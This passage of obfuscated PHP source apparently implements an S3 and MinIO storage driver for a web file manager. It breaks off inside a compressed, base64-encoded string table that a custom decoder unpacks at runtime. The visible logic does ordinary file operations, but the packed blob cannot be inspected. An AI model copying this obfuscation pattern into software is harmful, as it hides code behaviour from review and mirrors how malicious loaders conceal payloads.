str_replace($ô¬ˆâÀ£[177], $ô¬ˆâÀ£[8], rawurlencode($òÛç¨Ğâ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($·ÑÌÏÏ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ãìšã«™][178]; parent::__construct(); $this->_init($·ÑÌÏÏ); } public function _init($¿Î©§è˜) { foreach ($¿Î©§è˜ as $Æí¥°‡ => $¹èù»Éå) { if (isset($this->{$Æí¥°‡})) { $this->{$Æí¥°‡} = $¹èù»Éå; } } $this->endpoint = $¿Î©§è˜[$_SERVER[Ãìšã«™][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($‹ööñĞ = "\x76\x34") { $this->signVer = $‹ööñĞ; $this->client->setSignatureVersion($‹ööñĞ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $À²àâ…’ =& $_SERVER[Ãìšã«™]; $ŸÀ‘À = $this->getBucketCors(); if (!$ŸÀ‘À || !is_array($ŸÀ‘À)) { return !1; } if ($ŸÀ‘À[$À²àâ…’[180]] != $À²àâ…’[181] || $ŸÀ‘À[$À²àâ…’[182]] != $À²àâ…’[181]) { return !1; } $«ù½…È“ = array_map($À²àâ…’[183], $ŸÀ‘À[$À²àâ…’[184]]); if (!is_array($«ù½…È“)) { $«ù½…È“ = array(); } $¨¨Ãç’ = array($À²àâ…’[185], $À²àâ…’[186], $À²àâ…’[187], $À²àâ…’[188], $À²àâ…’[189]); $¯÷¹ïêÚ = array_diff($¨¨Ãç’, $«ù½…È“); return empty($¯÷¹ïêÚ); } public function mkfile($ç¢¯¶©, $ùÅŠ£˜Í = '', $ê¡ÒÛ„³ = REPEAT_RENAME) { $å··á…ë = $this->setContent($ç¢¯¶©, $ùÅŠ£˜Í); if ($å··á…ë !== !1) { return $this->getPathOuter($ç¢¯¶©); } return !1; } public function mkdir($ôÈÕö¶, $ÕèşÃª¢ = REPEAT_SKIP) { $£¢ãÆ£— =& $_SERVER[Ãìšã«™]; if (empty($ôÈÕö¶) && $ôÈÕö¶ !== $£¢ãÆ£—[190]) { return !1; } if ($this->_isFolder($ôÈÕö¶)) { return $this->getPathOuter($ôÈÕö¶); } $Êœ¶Äï— = $this->setContent($ôÈÕö¶, $£¢ãÆ£—[12], !0); if ($Êœ¶Äï— !== !1) { return $this->getPathOuter($ôÈÕö¶); } return !1; } public function copyFile($ÛÖ‰ÉüÉ, $ò›ÀùÂĞ, $ÏõÒäå = array()) { $‰ıøøÈà =& $_SERVER[Ãìšã«™]; $”íìäæš = $this->objectMeta($ÛÖ‰ÉüÉ); if (!$”íìäæš) { return !1; } if ($”íìäæš[$‰ıøøÈà[80]] <= 1024 * 1024 * 200) { $ÅçÅ—ã½ = $this->client->copyObject($this->bucket, $ÛÖ‰ÉüÉ, $this->bucket, $ò›ÀùÂĞ, $‰ıøøÈà[191], $ÏõÒäå); } else { $ÅçÅ—ã½ = $this->client->multiCopyObject($this->bucket, $ÛÖ‰ÉüÉ, $this->bucket, $ò›ÀùÂĞ, $ÏõÒäå); } $ÅçÅ—ã½ = $ÅçÅ—ã½ ? $this->getPathOuter($ò›ÀùÂĞ) : !1; return $ÅçÅ—ã½; } public function moveFile($ª›˜‘•«, $Çœ¬ü’ª) { if ($this->copyFile($ª›˜‘•«, $Çœ¬ü’ª)) { $this->delFile($ª›˜‘•«); return $this->getPathOuter($Çœ¬ü’ª); } return !1; } public function delFile($ğ†ş¦à¨) { return $this->client->deleteObject($this->bucket, $ğ†ş¦à¨); } public function delFolder($÷‹à…Ù) { $å™òÎ¡š =& $_SERVER[Ãìšã«™]; if (!$this->exist($÷‹à…Ù)) { return !0; } $this->listItemCache = !1; $íİÑª‰ = $this->fileList($÷‹à…Ù); $this->listItemCache = !0; $¾œ¶‰°Ş = trim($÷‹à…Ù, $å™òÎ¡š[8]) . $å™òÎ¡š[8]; if (!empty($÷‹à…Ù) && $÷‹à…Ù !== $å™òÎ¡š[190] && !in_array($¾œ¶‰°Ş, $íİÑª‰[$å™òÎ¡š[77]])) { $íİÑª‰[$å™òÎ¡š[77]][] = $¾œ¶‰°Ş; } $•ĞÀ³Ô = $this->delByBatch($íİÑª‰[$å™òÎ¡š[76]]); if (!$•ĞÀ³Ô) { return !1; } $•ĞÀ³Ô = $this->delByBatch($íİÑª‰[$å™òÎ¡š[77]]); if (!$•ĞÀ³Ô) { return !1; } return $this->delFile($¾œ¶‰°Ş); } private function delByBatch($»ÒãÎŞ™) { foreach (array_chunk($»ÒãÎŞ™, 1000) as $Àäù¤€í) { $ßÇ¡Ë­‰ = $this->client->deleteObjects($this->bucket, $Àäù¤€í); if (!$ßÇ¡Ë­‰) { return !1; } } return !0; } public function rename($ËËÒ‘ë½, $€Êü“Ò) { return $this->renameObject($ËËÒ‘ë½, $€Êü“Ò); } public function listPath($¬›İ§‹», $­¡®İ¤„ = false) { $Ôƒ„•ëæ =& $_SERVER[Ãìšã«™]; $¿€ö¡÷“ = $this->fileList($¬›İ§‹», $Ôƒ„•ëæ[8], !0); foreach ($¿€ö¡÷“[$Ôƒ„•ëæ[77]] as $ƒÉÉŠÃİ => $Ø¨Òõìª) { $¿€ö¡÷“[$Ôƒ„•ëæ[77]][$ƒÉÉŠÃİ] = $this->folderInfo($Ø¨Òõìª, $­¡®İ¤„); } foreach ($¿€ö¡÷“[$Ôƒ„•ëæ[76]] as $ƒÉÉŠÃİ => $Ø¨Òõìª) { $¿€ö¡÷“[$Ôƒ„•ëæ[76]][$ƒÉÉŠÃİ] = $this->fileInfo($Ø¨Òõìª[$Ôƒ„•ëæ[32]], $­¡®İ¤„, $Ø¨Òõìª); } return $¿€ö¡÷“; } private function fileInfo($Åº§²ò³, $¶­è›Â = false, $ÆŒü¡°Ç = array()) { $ÎŞÑ¡ˆù =& $_SERVER[Ãìšã«™]; $—¶ş›‰Ò = array($ÎŞÑ¡ˆù[32] => $this->pathThis($Åº§²ò³), $ÎŞÑ¡ˆù[78] => $this->getPathOuter($Åº§²ò³), $ÎŞÑ¡ˆù[33] => $ÎŞÑ¡ˆù[192], $ÎŞÑ¡ˆù[167] => $this->ext($Åº§²ò³), $ÎŞÑ¡ˆù[80] => isset($ÆŒü¡°Ç[$ÎŞÑ¡ˆù[80]]) ? $ÆŒü¡°Ç[$ÎŞÑ¡ˆù[80]] : 0); if ($¶­è›Â) { return $—¶ş›‰Ò; } $—¶ş›‰Ò[$ÎŞÑ¡ˆù[193]] = $—¶ş›‰Ò[$ÎŞÑ¡ˆù[86]] = 0; $—¶ş›‰Ò[$ÎŞÑ¡ˆù[194]] = $—¶ş›‰Ò[$ÎŞÑ¡ˆù[195]] = !0; if (empty($ÆŒü¡°Ç)) { $ÆŒü¡°Ç = $this->objectMeta($Åº§²ò³); if (!$ÆŒü¡°Ç) { return $—¶ş›‰Ò; } } if (isset($ÆŒü¡°Ç[$ÎŞÑ¡ˆù[196]])) { $—¶ş›‰Ò[$ÎŞÑ¡ˆù[86]] = $ÆŒü¡°Ç[$ÎŞÑ¡ˆù[196]]; } if (isset($ÆŒü¡°Ç[$ÎŞÑ¡ˆù[80]])) { $—¶ş›‰Ò[$ÎŞÑ¡ˆù[80]] = $ÆŒü¡°Ç[$ÎŞÑ¡ˆù[80]]; } return $—¶ş›‰Ò; } private function folderInfo($äéİö…, $Èã© Ç = false) { $¼•¿à¬ =& $_SERVER[Ãìšã«™]; $ Æ£Çõ = array($¼•¿à¬[32] => $this->pathThis($äéİö…), $¼•¿à¬[78] => $this->getPathOuter($¼•¿à¬[8] . $äéİö…), $¼•¿à¬[33] => $¼•¿à¬[79]); if ($Èã© Ç) { return $ Æ£Çõ; } $ Æ£Çõ[$¼•¿à¬[193]] = $ Æ£Çõ[$¼•¿à¬[86]] = 0; $ Æ£Çõ[$¼•¿à¬[194]] = $ Æ£Çõ[$¼•¿à¬[195]] = !0; if ($äéİö… == $¼•¿à¬[12]) { return $ Æ£Çõ; } $äéİö… = trim($äéİö…, $¼•¿à¬[8]) . $¼•¿à¬[8]; $¡Êº©îÀ = $this->objectMeta($äéİö…); if (isset($¡Êº©îÀ[$¼•¿à¬[196]])) { $ Æ£Çõ[$¼•¿à¬[193]] = $¡Êº©îÀ[$¼•¿à¬[196]]; } return $ Æ£Çõ; } private function fileList($öÉŞ·ä, $×¶½Ÿ–é = '', $”Í‹ª³ = 0) { $Ñ¾Ïòö =& $_SERVER[Ãìšã«™]; $ÉĞ—Şãï = rtrim($öÉŞ·ä, $Ñ¾Ïòö[8]) . $Ñ¾Ïòö[8]; $’ÛöšğÎ = $this->listObjs($ÉĞ—Şãï, null, null, $×¶½Ÿ–é); if (!$’ÛöšğÎ) { return array($Ñ¾Ïòö[77] => array(), $Ñ¾Ïòö[76] => array()); } $½ù‡À‡Ğ = $this->listItemCache === !1 ? !1 : !0; $ùŸóı÷ö = $ûöçÍ÷Ó = array(); foreach ($’ÛöšğÎ[$Ñ¾Ïòö[197]] as $ŞØøøÁØ) { $Şã·‡îÛ = $ŞØøøÁØ[$Ñ¾Ïòö[32]]; if ($Şã·‡îÛ == $ÉĞ—Şãï) { continue; } $ØŞªä = isset($ŞØøøÁØ[$Ñ¾Ïòö[80]]) ? $ŞØøøÁØ[$Ñ¾Ïòö[80]] : 0; $º÷êÍËÃ = $ØŞªä == 0 && substr($Şã·‡îÛ, strlen($Şã·‡îÛ) - 1, 1) == $Ñ¾Ïòö[8] ? !0 : !1; if ($½ù‡À‡Ğ) { $this->cacheMethod($Ñ¾Ïòö[198], $Şã·‡îÛ, $º÷êÍËÃ); $this->cacheMethod($Ñ¾Ïòö[199], $Şã·‡îÛ, $ŞØøøÁØ); } if ($º÷êÍËÃ) { $ùŸóı÷ö[] = $Şã·‡îÛ; continue; } $ûöçÍ÷Ó[] = $”Í‹ª³ ? $ŞØøøÁØ : $Şã·‡îÛ; } foreach ($’ÛöšğÎ[$Ñ¾Ïòö[200]] as $ŞØøøÁØ) { $ùŸóı÷ö[] = $ŞØøøÁØ[$Ñ¾Ïòö[32]]; if ($½ù‡À‡Ğ) { $this->cacheMethod($Ñ¾Ïòö[198], $ŞØøøÁØ[$Ñ¾Ïòö[32]], !0); } } if ($½ù‡À‡Ğ) { $this->cacheMethod($Ñ¾Ïòö[198], $öÉŞ·ä, !0); } return array($Ñ¾Ïòö[77] => $ùŸóı÷ö, $Ñ¾Ïòö[76] => $ûöçÍ÷Ó); } private function listObjs($„¹„²Ëå, $Ã‹ßù„ = null, $ƒ†¶ã¿Õ = null, $¯ÑÁÌ¡Ë = null) { $õı®ÑÉÁ =& $_SERVER[Ãìšã«™]; $„¹„²Ëå = trim($„¹„²Ëå, $õı®ÑÉÁ[8]); $ÍáÀƒ´„ = empty($„¹„²Ëå) && $„¹„²Ëå !== $õı®ÑÉÁ[190] ? $õı®ÑÉÁ[12] : $„¹„²Ëå . $õı®ÑÉÁ[8]; return $this->client->getBucket($this->bucket, $ÍáÀƒ´„, $Ã‹ßù„, $ƒ†¶ã¿Õ, $¯ÑÁÌ¡Ë, !0); } public function has($•ÚŸ£Šø, $Üóñ°Ï = false, $‰‡ü×† = true) { $®°ñŞ”• =& $_SERVER[Ãìšã«™]; $•ÚŸ£Šø = trim($•ÚŸ£Šø, $®°ñŞ”•[8]); $“¢Âüµ = empty($•ÚŸ£Šø) && $•ÚŸ£Šø !== $®°ñŞ”•[190] ? $®°ñŞ”•[12] : $•ÚŸ£Šø . $®°ñŞ”•[8]; $Ò…ÍœÖÓ = null; $¤¿ŞıÚ = 500; $˜øğô°ê = $®°ñŞ”•[8]; $ˆ¥ö«”Ç = $Èº›’åø = array(); while (!0) { $Ì„ö¡¶  = $this->listObjs($•ÚŸ£Šø, $Ò…ÍœÖÓ, $¤¿ŞıÚ, $˜øğô°ê); if (!$Ì„ö¡¶ ) { break; } $Ò…ÍœÖÓ = $Ì„ö¡¶ [$®°ñŞ”•[201]]; $ˆ§½÷¥ = $Ì„ö¡¶ [$®°ñŞ”•[197]]; $— ¡ò®è = $Ì„ö¡¶ [$®°ñŞ”•[200]]; if (empty($ˆ§½÷¥) && empty($— ¡ò®è)) { break; } if (count($ˆ§½÷¥) == 1 && $ˆ§½÷¥[0][$®°ñŞ”•[32]] == $“¢Âüµ) { break; } if ($Üóñ°Ï) { if (count($ˆ§½÷¥)) { $ˆ§½÷¥ = array_column($ˆ§½÷¥, $®°ñŞ”•[32]); $ˆ¥ö«”Ç = array_merge($ˆ¥ö«”Ç, $ˆ§½÷¥); } if (count($— ¡ò®è)) { $— ¡ò®è = array_column($— ¡ò®è, $®°ñŞ”•[32]); $Èº›’åø = array_merge($Èº›’åø, $— ¡ò®è); } if ($Ò…ÍœÖÓ === null) { break; } continue; } if ($‰‡ü×†) { if (!empty($ˆ§½÷¥)) { if (count($ˆ§½÷¥) > 1 || isset($ˆ§½÷¥[0][$®°ñŞ”•[32]]) && $ˆ§½÷¥[0][$®°ñŞ”•[32]] != $“¢Âüµ) { return !0; } } } else { if (!empty($— ¡ò®è)) { return !0; } } if ($Ò…ÍœÖÓ === null) { break; } } if ($Üóñ°Ï) { $ˆ¥ö«”Ç = array_diff($ˆ¥ö«”Ç, array($“¢Âüµ)); $ˆ¥ö«”Ç = count(array_unique($ˆ¥ö«”Ç)); $Èº›’åø = count(array_unique($Èº›’åø)); return array($®°ñŞ”•[202] => $ˆ¥ö«”Ç, $®°ñŞ”•[203] => $Èº›’åø); } return !1; } public function listAll($„¿Æ»˜Ä) { $ñ¶„ÕĞè =& $_SERVER[Ãìšã«™]; $şúËÕû° = $this->fileList($„¿Æ»˜Ä, $ñ¶„ÕĞè[12], !0); $¹•ßøµÇ = array(); foreach ($şúËÕû°[$ñ¶„ÕĞè[76]] as $Ü•ìï¦ˆ) { $¹•ßøµÇ[$Ü•ìï¦ˆ[$ñ¶„ÕĞè[32]]] = $Ü•ìï¦ˆ[$ñ¶„ÕĞè[80]]; } foreach ($şúËÕû°[$ñ¶„ÕĞè[77]] as $Ü•ìï¦ˆ) { if (is_string($Ü•ìï¦ˆ)) { $¹•ßøµÇ[$Ü•ìï¦ˆ] = 0; } } return $this->listAllFiles($„¿Æ»˜Ä, array_keys($¹•ßøµÇ), $¹•ßøµÇ); } public function canRead($ìö±šÜ”) { $¼áÇœÎ =& $_SERVER[Ãìšã«™]; $ôà‘Ì ß = $this->client->getAccessControlPolicy($this->bucket, $ìö±šÜ”); if (!$ôà‘Ì ß) { return !1; } return in_array($ôà‘Ì ß, array($¼áÇœÎ[204], $¼áÇœÎ[205], $¼áÇœÎ[206])) ? !0 : !1; } public function canWrite($Ú˜­Ñ) { $Ÿ¡Ø™ÁÊ =& $_SERVER[Ãìšã«™]; $ÀÅ¦—Ê‘ = $this->client->getAccessControlPolicy($this->bucket, $Ú˜­Ñ); if (!$ÀÅ¦—Ê‘) { return !1; } return in_array($ÀÅ¦—Ê‘, array($Ÿ¡Ø™ÁÊ[204], $Ÿ¡Ø™ÁÊ[205])) ? !0 : !1; } public function getContent($Âù¨³Ü†) { return $this->client->getObject($this->bucket, $Âù¨³Ü†); } public function setContent($«â¡½ˆü, $§Ş”ºÊ = '', $ıªÈûê½ = false) { $áÀåÜıÒ =& $_SERVER[Ãìšã«™]; $«â¡½ˆü = $ıªÈûê½ ? trim($«â¡½ˆü, $áÀåÜıÒ[8]) . $áÀåÜıÒ[8] : $«â¡½ˆü; $Ùõ¥Â‡ = get_file_mime(get_path_ext($«â¡½ˆü)); $«…Ê·ŒÒ = $this->client->putObject($§Ş”ºÊ, $this->bucket, $«â¡½ˆü, $áÀåÜıÒ[191], array(), $Ùõ¥Â‡); if (!$«…Ê·ŒÒ) { return !1; } if ($ıªÈûê½) { return !0; } $this->cacheMethod(null, null); $«…Ê·ŒÒ = $this->copyFile($«â¡½ˆü, $«â¡½ˆü, array($áÀåÜıÒ[207] => $«…Ê·ŒÒ[$áÀåÜıÒ[208]])); return $«…Ê·ŒÒ ? !0 : !1; } public function fileSubstr($ØØÙè˜, $…´Ş‰Šô, $ÂíèÍ¼½) { $ì¹ÇÕ³— = $…´Ş‰Šô + $ÂíèÍ¼½ - 1; return $this->client->getObject($this->bucket, $ØØÙè˜, array($_SERVER[Ãìšã«™][209] => "\x62\171\164\145\x73\x3d{$…´Ş‰Šô}\55{$ì¹ÇÕ³—}")); } public function upload($–Ê®Â, $¹æçÈ˜, $Ùñûôü = false, $ØšØµ” = REPEAT_REPLACE) { $õ²¡‡¹§ =& $_SERVER[Ãìšã«™]; $ñ´ë¤Š¸ = array($õ²¡‡¹§[207] => @md5_file($¹æçÈ˜)); $ÄˆÒ¿×Ş = array($õ²¡‡¹§[210] => get_file_mime(get_path_ext($–Ê®Â))); if (IO::size($¹æçÈ˜) <= 1024 * 1024 * 200) { $¥‘ô÷¥¯ = $this->client->putObjectFile($¹æçÈ˜, $this->bucket, $–Ê®Â, $õ²¡‡¹§[191], $ñ´ë¤Š¸, $ÄˆÒ¿×Ş); return !empty($¥‘ô÷¥¯) ? $this->getPathOuter($–Ê®Â) : !1; } $³¥Â“‘Ê = $this->client->multiUploadObject($¹æçÈ˜, $this->bucket, trim($–Ê®Â, $õ²¡‡¹§[8]), $ñ´ë¤Š¸, $ÄˆÒ¿×Ş); return $³¥Â“‘Ê ? $this->getPathOuter($–Ê®Â) : !1; } public function download($˜ßßÄ, $Å¬œ’§û) { if (!@is_dir($this->pathFather($Å¬œ’§û)) && !IO::mkdir($this->pathFather($Å¬œ’§û))) { return !1; } $·° ½Ëô = $this->client->getObject($this->bucket, $˜ßßÄ, array(), $Å¬œ’§û); return $·° ½Ëô !== !1 ? $Å¬œ’§û : !1; } public function link($²Á°ÊûÇ, $ë™› = array()) { $ã²úìµ¥ =& $_SERVER[Ãìšã«™]; if ($this->signVer == $ã²úìµ¥[211]) { return $this->client->getAuthenticatedURL($this->bucket, $²Á°ÊûÇ, 3600 * 12, $ë™›); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($²Á°ÊûÇ, $ã²úìµ¥[8]), 3600 * 12, $this->region, array(), !0, $ë™›); } public function fileOut($ø”¾Ñ‡–, $úı¢ã»Á = false, $ƒºĞŸòÑ = false, $öãäü‘ã = '') { $‚§³Ùü² =& $_SERVER[Ãìšã«™]; if ($this->isFileOutServer()) { return $this->fileOutServer($ø”¾Ñ‡–, $úı¢ã»Á, $ƒºĞŸòÑ, $öãäü‘ã); } if (!$ƒºĞŸòÑ) { $ƒºĞŸòÑ = $this->pathThis($ø”¾Ñ‡–); } $˜¹„¤®§ = get_file_mime(get_path_ext($ƒºĞŸòÑ)); if ($˜¹„¤®§ == $‚§³Ùü²[212]) { return parent::fileOut($ø”¾Ñ‡–, $úı¢ã»Á, $ƒºĞŸòÑ, $öãäü‘ã); } $×ğ±Š¹« = array($‚§³Ùü²[213] => $˜¹„¤®§); if ($úı¢ã»Á) { $×ğ±Š¹«[$‚§³Ùü²[214]] = $‚§³Ùü²[215] . rawurlencode($ƒºĞŸòÑ); } else { } $òİæîÒæ = $this->link($ø”¾Ñ‡–, $×ğ±Š¹«); $this->fileOutLink($òİæîÒæ); } public function fileOutServer($•³½š¹ë, $ğ¿¸ø°ò = false, $Ä“»„ıô = false, $Óù˜®ã– = '') { parent::fileOut($•³½š¹ë, $ğ¿¸ø°ò, $Ä“»„ıô, $Óù˜®ã–); } public function fileOutImageServer($Êõô ©Í, $«à¦áú® = 250) { parent::fileOutImage($Êõô ©Í, $«à¦áú®); } public function hashMd5($ÁºŸì™, $©‹°âä¼ = '') { $ŠÙ‰˜½ =& $_SERVER[Ãìšã«™]; $îÙ‚¤õİ = $this->objectMeta($ÁºŸì™); if (!$îÙ‚¤õİ) { return !1; } $©‹°âä¼ = $©‹°âä¼ ? $©‹°âä¼ : _get($îÙ‚¤õİ, $ŠÙ‰˜½[216]); $©‹°âä¼ = $©‹°âä¼ ? $©‹°âä¼ : _get($îÙ‚¤õİ, $ŠÙ‰˜½[208], $ŠÙ‰˜½[12]); return $©‹°âä¼; } public function uploadFormData($ä•×ŸòÆ, $µöÓĞ¾© = 3600) { $€¾ôÌíù =& $_SERVER[Ãìšã«™]; $¹õÌ¹ = $this->pathFather($ä•×ŸòÆ); $á‚ÄÒÚê = $this->client->getHttpUploadPostParams($this->bucket, $¹õÌ¹, $€¾ôÌíù[191], $µöÓĞ¾©); return array_merge((array) $á‚ÄÒÚê, array($€¾ôÌíù[174] => $this->getHost())); } public function multiUploadFormData($ëÉ°ºô®, $”ÊÜí­û = 3600) { $¢ÜÜ¡¤û =& $_SERVER[Ãìšã«™]; $ØÓşú = gmdate($¢ÜÜ¡¤û[217]); $ú§Õˆî¬ = array(); $ê¹¯À¼ã = $this->client->getUploadId($this->bucket, $ëÉ°ºô®, $ú§Õˆî¬); if (!$ê¹¯À¼ã) { return !1; } return array($¢ÜÜ¡¤û[218] => $ê¹¯À¼ã, $¢ÜÜ¡¤û[174] => $this->getHost() . $¢ÜÜ¡¤û[8] . $this->pathEncode($ëÉ°ºô®), $¢ÜÜ¡¤û[219] => $ØÓşú, $¢ÜÜ¡¤û[95] => $ëÉ°ºô®); } public function multiUploadAuthData($ìÃ©™, $„£İ·İ = array()) { $ïñöı´ =& $_SERVER[Ãìšã«™]; $Ş¨‹Ñ = isset($„£İ·İ[$ïñöı´[219]]) ? $„£İ·İ[$ïñöı´[219]] : gmdate($ïñöı´[217]); $Êã‘Ì®Ö = isset($„£İ·İ[$ïñöı´[167]]) ? $„£İ·İ[$ïñöı´[167]] : $ïñöı´[12]; $´òûªÉº = $„£İ·İ[$ïñöı´[95]]; unset($„£İ·İ[$ïñöı´[95]]); if (isset($„£İ·İ[$ïñöı´[220]])) { $„£İ·İ[$ïñöı´[219]] = $Ş¨‹Ñ; return $this->listUploadParts($´òûªÉº, $„£İ·İ); } $£˜†ôÎ› = array($ïñöı´[221], $ïñöı´[12], $ïñöı´[118], $ïñöı´[12], "\170\55\x61\155\x7a\55\144\x61\164\145\x3a{$Ş¨‹Ñ}", $ïñöı´[8] . $this->bucket . $ïñöı´[8] . $this->pathEncode($´òûªÉº) . $Êã‘Ì®Ö); if (strpos($Êã‘Ì®Ö, $ïñöı´[222]) === 0) { $£˜†ôÎ›[0] = $ïñöı´[223]; } if (isset($„£İ·İ[$ïñöı´[224]]) && $„£İ·İ[$ïñöı´[224]] == $ïñöı´[225]) { $£˜†ôÎ›[0] = $ïñöı´[225]; } $—å“‘‡Î = implode($ïñöı´[226], $£˜†ôÎ›); $Æ—¬ö§Å = base64_encode(hash_hmac($ïñöı´[227], $—å“‘‡Î, $this->secret, !0)); $×™Áş¼Ñ = $ïñöı´[228] . $this->accessKey . $ïñöı´[4] . $Æ—¬ö§Å; if (strpos($Êã‘Ì®Ö, $ïñöı´[222]) === 0) { return array($ïñöı´[229] => $×™Áş¼Ñ, $ïñöı´[219] => $Ş¨‹Ñ); } return $×™Áş¼Ñ; } public function listUploadParts($ºõ¹¶­Ú, $ôÛÍöÓ½ = array()) { $–Î›¢¾ƒ =& $_SERVER[Ãìšã«™]; $Ùæáºãœ = str_replace($–Î›¢¾ƒ[230], $–Î›¢¾ƒ[12], $ôÛÍöÓ½[$–Î›¢¾ƒ[167]]); $˜ÔàöÍè = $this->client->listParts($this->bucket, $ºõ¹¶­Ú, $Ùæáºãœ); if (!$˜ÔàöÍè) { return !1; } unset($ôÛÍöÓ½[$–Î›¢¾ƒ[220]], $ôÛÍöÓ½[$–Î›¢¾ƒ[224]]); $ôÛÍöÓ½[$–Î›¢¾ƒ[95]] = $ºõ¹¶­Ú; $úÍÜğ÷ = $this->multiUploadAuthData($ºõ¹¶­Ú, $ôÛÍöÓ½); if (empty($úÍÜğ÷)) { return !1; } return array($–Î›¢¾ƒ[229] => $úÍÜğ÷, $–Î›¢¾ƒ[219] => $ôÛÍöÓ½[$–Î›¢¾ƒ[219]], $–Î›¢¾ƒ[231] => $˜ÔàöÍè); } public function getHost() { return parent::getHost() . $_SERVER[Ãìšã«™][8] . $this->bucket; } public function size($ˆßªÜøç) { $ëÖ”»³Õ = $this->objectMeta($ˆßªÜøç); return $ëÖ”»³Õ ? $ëÖ”»³Õ[$_SERVER[Ãìšã«™][80]] : 0; } public function info($“˜ˆîÇ) { if ($this->isFolder($“˜ˆîÇ)) { return $this->folderInfo($“˜ˆîÇ); } else { if ($this->isFile($“˜ˆîÇ)) { return $this->fileInfo($“˜ˆîÇ); } } return !1; } public function exist($‘êëÛÔ¬) { return $this->isFile($‘êëÛÔ¬) || $this->isFolder($‘êëÛÔ¬); } public function isFile($¤•Áµ©¹) { return !$this->isFolder($¤•Áµ©¹) && $this->objectMeta($¤•Áµ©¹); } public function isFolder($Åğ£ÚÎï) { return $this->cacheMethod($_SERVER[Ãìšã«™][198], $Åğ£ÚÎï); } protected function objectMeta($îóƒÀŠ) { return $this->cacheMethod($_SERVER[Ãìšã«™][199], $îóƒÀŠ); } protected function _objectMeta($©—Ñ¼Íª) { $ÁõıÊ²ü =& $_SERVER[Ãìšã«™]; $©—Ñ¼Íª = rtrim($©—Ñ¼Íª, $ÁõıÊ²ü[8]); try { $·Òğ = $this->client->getObjectInfo($this->bucket, $©—Ñ¼Íª); if (!isset($·Òğ[$ÁõıÊ²ü[216]]) && isset($·Òğ[$ÁõıÊ²ü[232]])) { $·Òğ[$ÁõıÊ²ü[216]] = $·Òğ[$ÁõıÊ²ü[232]]; } } catch (Exception $˜‹ÍÉ„¸) { $·Òğ = !1; } if (!$·Òğ) { } return $·Òğ; } protected function _isFolder($›íÓˆ½) { $æë¼ø² =& $_SERVER[Ãìšã«™]; $›íÓˆ½ = rtrim($›íÓˆ½, $æë¼ø²[8]); if ($›íÓˆ½ == $æë¼ø²[12] || $›íÓˆ½ == $æë¼ø²[8]) { return !0; } $û†£õİÅ = $this->client->getBucket($this->bucket, $›íÓˆ½, null, 1); if (empty($û†£õİÅ[$æë¼ø²[197]])) { return !1; } $·¯ÑÄÏ = $û†£õİÅ[$æë¼ø²[197]][0][$æë¼ø²[32]]; return stripos($·¯ÑÄÏ, $›íÓˆ½ . $æë¼ø²[8]) === 0 ? !0 : !1; if (substr($·¯ÑÄÏ, -1) == $æë¼ø²[8]) { return !0; } if (get_path_this($·¯ÑÄÏ) == get_path_this($›íÓˆ½)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($€ÚÄ‰Öâ) { parent::__construct($€ÚÄ‰Öâ); $this->signatureVersion($_SERVER[Ãìšã«™][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto E–¼ÎØ¿Ÿ; cí¨÷†‘Àâ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('w+ya46uZ'), "\x95\x81\x91\x92\xd6\xe8"); $_SERVER[Ãìšã«™] = explode("\174\1\174\4\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\174\33\305\365\70\336\362\205\226\243\320\26\50\245\234\213\41\261\235\350\260\235\333\211\23\144\133\266\105\144\311\221\344\34".base64_decode('xI6yllbS2pJW2V35yAEJlHKGcF8NN6RQINx3IFBogUILhbaE0hPiJECB0hbK1fY=')."\67\307\233\143\127\62\174\377\237\377\357\363\371\5\22\355\274\271\147\336\274\171\357\315\233\67\133\236\170\355\255\353\157\133\373\325\265\173\257\375\237\27\67\154\176\371\347".base64_decode('t9Jv9N9e6C/5Pvbcfb9C/hxy7jl1dV0z958a+cam++5Qt6o/Vs+Php9/IXTgL28=').base64_decode('Pym468bnx3Z99Suf/8ya2owS07zN9EcpGraijeqWbVFAyihm9Cz91ov0109/emM=').base64_decode('YVMrGLZGgz76k4R2kX+tVXmdxScj0UQy3tvTE4wlIFGzHF8w0vBVUk21APWXNNM=')."\102\255\221\213\113\226\214\222\126\164\100\4\40\255\332\352\200\152\101\111\355\255\311\366\140\117\70\272\54\231\130\326\23\204\24\3\311\125\145\315\34\243\41\362\31\267\125"."\xd3\x4e\xe8\x5\x8d\xa7\x18\x31\x79\xbb\x5a\x83\x9d\xa1\x88\x92\x88\x5\x22\xf1\x40\x5b\x22\x14\x8d\x50\x70\x5b\xb4\xbb\x3b\x94\xa8\x84\xc7\xa2\xe1\x70\x6b\xa0\x6d\x61\x65\x4c\x4f\x2c\xd0".base64_decode('2R1QUPvyWlIvZow6ZSWNWanU048OXcun6WdRZc2xx0rwleBfaJqK5XyeBiL8K60=')."\x65\xd4\x72\x1e\x46\xab\x5d\xe\x94\x4c\xbd\xa0\xb2\x4e\x2f\xd4\xc6\x38\x94\x7e\xa8\x65\xdb\xd0\x8b\x29\x1a\x8\x8e\xda\xa6\x2a\xe0\xa8\xad\x29\x34\xd1\x5a\x11\x8a\x8a\x7\xc3\xc1\xb6\x84".base64_decode('ghuodMSi3QpMQkG1bM1UlnQFY0EFN7qllvS1VgF8iaChUALhsDJRCbZWKLFiaJ4=')."\52\205\105\143\355\301\230\322\272\114\21\43\224\62\12\5\243\350\103\245\240\231\264\245\246\6\143\61\372\341\1\364\16\207\360\244\101\40\332\